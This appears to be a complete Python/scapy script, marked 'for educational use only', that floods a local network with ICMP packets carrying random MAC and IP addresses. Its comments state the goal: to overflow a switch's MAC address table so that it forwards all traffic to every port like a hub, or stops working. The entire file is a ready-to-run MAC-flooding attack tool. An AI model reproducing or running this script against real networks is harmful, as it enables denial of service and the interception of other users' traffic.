#!/usr/bin/python

# This tool is for educational use only!

# Description: By sending random ethernet traffic over the network, a network
# switch's mac address store will be filled. The goal is to force the switch
# to only functione as a hub or not working anymore. Then all network traffic
# will be sent to everyone connected to the switch (now a hub). Or the switch
# give up and do nothing :)

# Requirements: scapy + root privilegues

import sys
from scapy.all import *

# Make a new ehternet ICMP (ping) packet with random mac and ip addresses
packet = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*")) / \
         ICMP()

# default interface is 'eth0'
if len(sys.argv) < 2:
  dev = "eth0"
else:
  dev = sys.argv[1]

print "Flooding LAN with random packets on interface " + dev

while True:
  sendp(packet, iface=dev)
